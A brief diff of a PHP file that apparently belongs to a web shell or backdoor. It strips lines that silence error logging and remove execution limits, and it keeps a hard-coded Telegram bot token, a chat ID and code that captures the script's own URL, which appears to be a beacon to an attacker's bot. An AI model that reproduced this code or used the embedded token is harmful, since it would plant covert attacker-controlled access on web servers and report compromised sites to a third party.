@@ -1,11 +1,5 @@
 <?php         
 session_start();
-@ignore_user_abort(true);
-@ini_set('memory_limit', '-1');
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@set_time_limit(0);
 $bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
